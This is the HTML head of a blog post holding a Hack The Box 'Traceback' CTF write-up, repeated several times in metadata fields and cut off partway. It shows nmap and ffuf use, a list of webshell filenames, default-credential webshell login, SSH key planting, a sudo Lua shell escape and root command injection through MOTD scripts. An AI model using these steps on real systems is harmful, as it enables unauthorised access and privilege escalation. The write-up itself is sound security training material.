<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Hackthebox Traceback Writeup | Vibhu025</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="Hackthebox Traceback Writeup" /><meta name="author" content="Vibhu Bansal" /><meta property="og:locale" content="en_US" /><meta name="description" content="Information:~$ Title Details Name Traceback IP 10.10.10.181 Difficulty Easy Points 20 OS Linux Creator Xh4H Brief:~$ Traceback is easy rated linux box. Intial foothold can be gained using already available webshells on PORT 80 For Priv Esec sysadmin has by exploiting lua Programming language and for root we can edit the update-mote.d to gain info when logging thorugh SSH Reconnaisance:~$ Nmap Scan:~$ 1 nmap -sC -sV -oN nmap/initial 10.10.10.181 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.80 scan initiated Sun Mar 15 20:18:30 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.181 Nmap scan report for 10.10.10.181 Host is up (0.46s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us 3000/tcp filtered ppp Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Mar 15 20:20:03 2020 -- 1 IP address (1 host up) scanned in 93.34 seconds We get 2 Ports Open Lets visit PORT 80 On visiting the Page we get On analyzing the Source code I found 1 2 3 4 5 6 7 8 &lt;body&gt; &lt;center&gt; &lt;h1&gt;This site has been owned&lt;/h1&gt; &lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt; &lt;h3&gt; - Xh4H - &lt;/h3&gt; &lt;!--Some of the best web shells that you might need ;)--&gt; &lt;/center&gt; &lt;/body&gt; Seems to be some kind of Osint related. On quick google search I founded creator github repo with webshells Here Let’s copy these names and see if there is any webshell from these in website 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ cat shell.list alfa3.php alfav3.0.1.php andela.php bloodsecv4.php by.php c99ud.php cmd.php configkillerionkros.php jspshell.jsp mini.php obfuscated-punknopass.php punk-nopass.php punkholic.php r57.php smevk.php wso2.8.5.php I am going to use FFUF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ ffuf -c -w shell.list -u http://10.10.10.181/FUZZ /&#39;___\ /&#39;___\ /&#39;___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.181/FUZZ :: Wordlist : FUZZ: shell.list :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ smevk.php [Status: 200, Size: 1261, Words: 318, Lines: 59] :: Progress: [16/16] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:03] :: Errors: 0 :: We got a match let’s visit 10.10.10.181/smevk.php On trying admin:admin I got access Initial Foothold:~$ Current user is webadmin and We can upload file in it home dir So Let’s upload our ssh keys and get a ssh connection Firstly let’s create ssh keys using ssh-keygen 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [vibhu@parrot]─[~/.ssh]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/vibhu/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/vibhu/.ssh/id_rsa Your public key has been saved in /home/vibhu/.ssh/id_rsa.pub The key fingerprint is: SHA256:g2q/D1QAaxEjXK5yCmZmPXDJHcWuup0teaLrTFHuCVE vibhu@parrot The key&#39;s randomart image is: +---[RSA 3072]----+ | ...*E+. | | oo++.o | | . =+o. . | | +o+ + | |o=o= .+ S | |*+ =+. . | |. .+oo | | oo.=oo | | .*+o*+. | +----[SHA256]-----+ [vibhu@parrot]─[~/.ssh]$ now move id_rsa.pub to authorized_keys and upload it in webshell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181 ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 7 10:17:41 2020 from 10.10.14.166 webadmin@traceback:~$ whoami &amp;&amp; id webadmin uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare) webadmin@traceback:~$ We get a note in home/webadmin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 webadmin@traceback:~$ ls note.txt webadmin@traceback:~$ cat note.txt - sysadmin - I have left a tool to practice Lua. I am sure you know where to find it. Contact me if you have any question. webadmin@traceback:~$ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit webadmin@traceback:~$ Privilege Escalation:~$ webadmin -&gt; sysadmin Looks like sysadmin has left something related to lua language for us in his home directory After some enumertaion I saw we can use GTFObins to do priv esec So final command would be sudo -u sysadmin /home/sysadmin/luvit -e ‘os.execute(“/bin/sh”)’ 1 2 3 4 5 6 7 webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39; $ id id uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) $ whoami whoami sysadmin and we got user 1 2 3 4 5 6 7 8 $ cd cd $ ls ls luvit pspy64 sysadmin_ssh.pub user.txt $ cat user.txt cat user.txt 6bb2*********************302fec sysadmin -&gt; root While Logging In Via SSH I Found Some Comments, It’s Called Message Of The Day In Linux. It’s Located In 00-header File Under /etc/update-motd.d/ Directory. 1 2 3 4 5 6 7 8 9 sysadmin@traceback:/etc/update-motd.d$ ls -lah total 32K drwxr-xr-x 2 root sysadmin 4.0K Aug 27 2019 . drwxr-xr-x 80 root root 4.0K Mar 16 03:55 .. -rwxrwxr-x 1 root sysadmin 981 Jul 7 10:23 00-header -rwxrwxr-x 1 root sysadmin 982 Jul 7 10:23 10-help-text -rwxrwxr-x 1 root sysadmin 4.2K Jul 7 10:23 50-motd-news -rwxrwxr-x 1 root sysadmin 604 Jul 7 10:23 80-esm -rwxrwxr-x 1 root sysadmin 299 Jul 7 10:23 91-release-upgrade 00-header contain the meesage that is displayed on login via ssh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 sysadmin@traceback:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release echo &quot;\nWelcome to Xh4H land \n&quot; sysadmin@traceback:/etc/update-motd.d$ Let’s see if we can read root flag through this echo “cat /root/root.txt” » 00-header echo “id &amp;&amp; whoami” » 00-header 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sysadmin@traceback:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release echo &quot;\nWelcome to Xh4H land \n&quot; cat /root/root.txt id &amp;&amp; whoami sysadmin@traceback:/etc/update-motd.d$ And on login again via SSH i got the root flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181 ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land 9fdc59db[Redacted]58d49e5a uid=0(root) gid=0(root) groups=0(root) root Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 7 10:34:22 2020 from 10.10.14.166 webadmin@traceback:~$ Resources:~$ Topic Link GTFObins Lua Here Update-mode.d Here With this, we come to the end of the story of how I owned Traceback 😃 Thank you for reading !!! I would love to hear about any suggestions or queries." /><meta property="og:description" content="Information:~$ Title Details Name Traceback IP 10.10.10.181 Difficulty Easy Points 20 OS Linux Creator Xh4H Brief:~$ Traceback is easy rated linux box. Intial foothold can be gained using already available webshells on PORT 80 For Priv Esec sysadmin has by exploiting lua Programming language and for root we can edit the update-mote.d to gain info when logging thorugh SSH Reconnaisance:~$ Nmap Scan:~$ 1 nmap -sC -sV -oN nmap/initial 10.10.10.181 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.80 scan initiated Sun Mar 15 20:18:30 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.181 Nmap scan report for 10.10.10.181 Host is up (0.46s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us 3000/tcp filtered ppp Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Mar 15 20:20:03 2020 -- 1 IP address (1 host up) scanned in 93.34 seconds We get 2 Ports Open Lets visit PORT 80 On visiting the Page we get On analyzing the Source code I found 1 2 3 4 5 6 7 8 &lt;body&gt; &lt;center&gt; &lt;h1&gt;This site has been owned&lt;/h1&gt; &lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt; &lt;h3&gt; - Xh4H - &lt;/h3&gt; &lt;!--Some of the best web shells that you might need ;)--&gt; &lt;/center&gt; &lt;/body&gt; Seems to be some kind of Osint related. On quick google search I founded creator github repo with webshells Here Let’s copy these names and see if there is any webshell from these in website 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ cat shell.list alfa3.php alfav3.0.1.php andela.php bloodsecv4.php by.php c99ud.php cmd.php configkillerionkros.php jspshell.jsp mini.php obfuscated-punknopass.php punk-nopass.php punkholic.php r57.php smevk.php wso2.8.5.php I am going to use FFUF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ ffuf -c -w shell.list -u http://10.10.10.181/FUZZ /&#39;___\ /&#39;___\ /&#39;___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.181/FUZZ :: Wordlist : FUZZ: shell.list :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ smevk.php [Status: 200, Size: 1261, Words: 318, Lines: 59] :: Progress: [16/16] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:03] :: Errors: 0 :: We got a match let’s visit 10.10.10.181/smevk.php On trying admin:admin I got access Initial Foothold:~$ Current user is webadmin and We can upload file in it home dir So Let’s upload our ssh keys and get a ssh connection Firstly let’s create ssh keys using ssh-keygen 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [vibhu@parrot]─[~/.ssh]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/vibhu/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/vibhu/.ssh/id_rsa Your public key has been saved in /home/vibhu/.ssh/id_rsa.pub The key fingerprint is: SHA256:g2q/D1QAaxEjXK5yCmZmPXDJHcWuup0teaLrTFHuCVE vibhu@parrot The key&#39;s randomart image is: +---[RSA 3072]----+ | ...*E+. | | oo++.o | | . =+o. . | | +o+ + | |o=o= .+ S | |*+ =+. . | |. .+oo | | oo.=oo | | .*+o*+. | +----[SHA256]-----+ [vibhu@parrot]─[~/.ssh]$ now move id_rsa.pub to authorized_keys and upload it in webshell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181 ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 7 10:17:41 2020 from 10.10.14.166 webadmin@traceback:~$ whoami &amp;&amp; id webadmin uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare) webadmin@traceback:~$ We get a note in home/webadmin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 webadmin@traceback:~$ ls note.txt webadmin@traceback:~$ cat note.txt - sysadmin - I have left a tool to practice Lua. I am sure you know where to find it. Contact me if you have any question. webadmin@traceback:~$ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit webadmin@traceback:~$ Privilege Escalation:~$ webadmin -&gt; sysadmin Looks like sysadmin has left something related to lua language for us in his home directory After some enumertaion I saw we can use GTFObins to do priv esec So final command would be sudo -u sysadmin /home/sysadmin/luvit -e ‘os.execute(“/bin/sh”)’ 1 2 3 4 5 6 7 webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39; $ id id uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) $ whoami whoami sysadmin and we got user 1 2 3 4 5 6 7 8 $ cd cd $ ls ls luvit pspy64 sysadmin_ssh.pub user.txt $ cat user.txt cat user.txt 6bb2*********************302fec sysadmin -&gt; root While Logging In Via SSH I Found Some Comments, It’s Called Message Of The Day In Linux. It’s Located In 00-header File Under /etc/update-motd.d/ Directory. 1 2 3 4 5 6 7 8 9 sysadmin@traceback:/etc/update-motd.d$ ls -lah total 32K drwxr-xr-x 2 root sysadmin 4.0K Aug 27 2019 . drwxr-xr-x 80 root root 4.0K Mar 16 03:55 .. -rwxrwxr-x 1 root sysadmin 981 Jul 7 10:23 00-header -rwxrwxr-x 1 root sysadmin 982 Jul 7 10:23 10-help-text -rwxrwxr-x 1 root sysadmin 4.2K Jul 7 10:23 50-motd-news -rwxrwxr-x 1 root sysadmin 604 Jul 7 10:23 80-esm -rwxrwxr-x 1 root sysadmin 299 Jul 7 10:23 91-release-upgrade 00-header contain the meesage that is displayed on login via ssh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 sysadmin@traceback:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release echo &quot;\nWelcome to Xh4H land \n&quot; sysadmin@traceback:/etc/update-motd.d$ Let’s see if we can read root flag through this echo “cat /root/root.txt” » 00-header echo “id &amp;&amp; whoami” » 00-header 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sysadmin@traceback:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release echo &quot;\nWelcome to Xh4H land \n&quot; cat /root/root.txt id &amp;&amp; whoami sysadmin@traceback:/etc/update-motd.d$ And on login again via SSH i got the root flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181 ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land 9fdc59db[Redacted]58d49e5a uid=0(root) gid=0(root) groups=0(root) root Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 7 10:34:22 2020 from 10.10.14.166 webadmin@traceback:~$ Resources:~$ Topic Link GTFObins Lua Here Update-mode.d Here With this, we come to the end of the story of how I owned Traceback 😃 Thank you for reading !!! I would love to hear about any suggestions or queries." /><link rel="canonical" href="https://vibhu025.github.io/posts/htb-traceback/" /><meta property="og:url" content="https://vibhu025.github.io/posts/htb-traceback/" /><meta property="og:site_name" content="Vibhu025" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-18T20:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Traceback Writeup" /><meta name="twitter:site" content="@vibhu_bansal_" /><meta name="twitter:creator" content="@Vibhu Bansal" /><meta name="google-site-verification" content="5xMZIhlSB7kY8SbDl6jvkENHoVeMk03mpzOaOe0gj0U" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"https://vibhu025.github.io/posts/htb-traceback/","headline":"Hackthebox Traceback Writeup","dateModified":"2020-03-18T20:00:00+05:30","datePublished":"2020-03-18T20:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://vibhu025.github.io/posts/htb-traceback/"},"author":{"@type":"Person","name":"Vibhu Bansal"},"description":"Information:~$ Title Details Name Traceback IP 10.10.10.181 Difficulty Easy Points 20 OS Linux Creator Xh4H Brief:~$ Traceback is easy rated linux box. Intial foothold can be gained using already available webshells on PORT 80 For Priv Esec sysadmin has by exploiting lua Programming language and for root we can edit the update-mote.d to gain info when logging thorugh SSH Reconnaisance:~$ Nmap Scan:~$ 1 nmap -sC -sV -oN nmap/initial 10.10.10.181 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.80 scan initiated Sun Mar 15 20:18:30 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.181 Nmap scan report for 10.10.10.181 Host is up (0.46s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us 3000/tcp filtered ppp Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Mar 15 20:20:03 2020 -- 1 IP address (1 host up) scanned in 93.34 seconds We get 2 Ports Open Lets visit PORT 80 On visiting the Page we get On analyzing the Source code I found 1 2 3 4 5 6 7 8 &lt;body&gt; &lt;center&gt; &lt;h1&gt;This site has been owned&lt;/h1&gt; &lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt; &lt;h3&gt; - Xh4H - &lt;/h3&gt; &lt;!--Some of the best web shells that you might need ;)--&gt; &lt;/center&gt; &lt;/body&gt; Seems to be some kind of Osint related. On quick google search I founded creator github repo with webshells Here Let’s copy these names and see if there is any webshell from these in website 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ cat shell.list alfa3.php alfav3.0.1.php andela.php bloodsecv4.php by.php c99ud.php cmd.php configkillerionkros.php jspshell.jsp mini.php obfuscated-punknopass.php punk-nopass.php punkholic.php r57.php smevk.php wso2.8.5.php I am going to use FFUF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ ffuf -c -w shell.list -u http://10.10.10.181/FUZZ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.181/FUZZ :: Wordlist : FUZZ: shell.list :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ smevk.php [Status: 200, Size: 1261, Words: 318, Lines: 59] :: Progress: [16/16] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:03] :: Errors: 0 :: We got a match let’s visit 10.10.10.181/smevk.php On trying admin:admin I got access Initial Foothold:~$ Current user is webadmin and We can upload file in it home dir So Let’s upload our ssh keys and get a ssh connection Firstly let’s create ssh keys using ssh-keygen 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [vibhu@parrot]─[~/.ssh]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/vibhu/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/vibhu/.ssh/id_rsa Your public key has been saved in /home/vibhu/.ssh/id_rsa.pub The key fingerprint is: SHA256:g2q/D1QAaxEjXK5yCmZmPXDJHcWuup0teaLrTFHuCVE vibhu@parrot The key&#39;s randomart image is: +---[RSA 3072]----+ | ...*E+. | | oo++.o | | . =+o. . | | +o+ + | |o=o= .+ S | |*+ =+. . | |. .+oo | | oo.=oo | | .*+o*+. | +----[SHA256]-----+ [vibhu@parrot]─[~/.ssh]$ now move id_rsa.pub to authorized_keys and upload it in webshell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181 ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 7 10:17:41 2020 from 10.10.14.166 webadmin@traceback:~$ whoami &amp;&amp; id webadmin uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare) webadmin@traceback:~$ We get a note in home/webadmin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 webadmin@traceback:~$ ls note.txt webadmin@traceback:~$ cat note.txt - sysadmin - I have left a tool to practice Lua. I am sure you know where to find it. Contact me if you have any question. webadmin@traceback:~$ sudo -l Matching Defaults entries for webadmin on traceback: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User webadmin may run the following commands on traceback: (sysadmin) NOPASSWD: /home/sysadmin/luvit webadmin@traceback:~$ Privilege Escalation:~$ webadmin -&gt; sysadmin Looks like sysadmin has left something related to lua language for us in his home directory After some enumertaion I saw we can use GTFObins to do priv esec So final command would be sudo -u sysadmin /home/sysadmin/luvit -e ‘os.execute(“/bin/sh”)’ 1 2 3 4 5 6 7 webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39; $ id id uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) $ whoami whoami sysadmin and we got user 1 2 3 4 5 6 7 8 $ cd cd $ ls ls luvit pspy64 sysadmin_ssh.pub user.txt $ cat user.txt cat user.txt 6bb2*********************302fec sysadmin -&gt; root While Logging In Via SSH I Found Some Comments, It’s Called Message Of The Day In Linux. It’s Located In 00-header File Under /etc/update-motd.d/ Directory. 1 2 3 4 5 6 7 8 9 sysadmin@traceback:/etc/update-motd.d$ ls -lah total 32K drwxr-xr-x 2 root sysadmin 4.0K Aug 27 2019 . drwxr-xr-x 80 root root 4.0K Mar 16 03:55 .. -rwxrwxr-x 1 root sysadmin 981 Jul 7 10:23 00-header -rwxrwxr-x 1 root sysadmin 982 Jul 7 10:23 10-help-text -rwxrwxr-x 1 root sysadmin 4.2K Jul 7 10:23 50-motd-news -rwxrwxr-x 1 root sysadmin 604 Jul 7 10:23 80-esm -rwxrwxr-x 1 root sysadmin 299 Jul 7 10:23 91-release-upgrade 00-header contain the meesage that is displayed on login via ssh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 sysadmin@traceback:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release echo &quot;\\nWelcome to Xh4H land \\n&quot; sysadmin@traceback:/etc/update-motd.d$ Let’s see if we can read root flag through this echo “cat /root/root.txt” » 00-header echo “id &amp;&amp; whoami” » 00-header 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 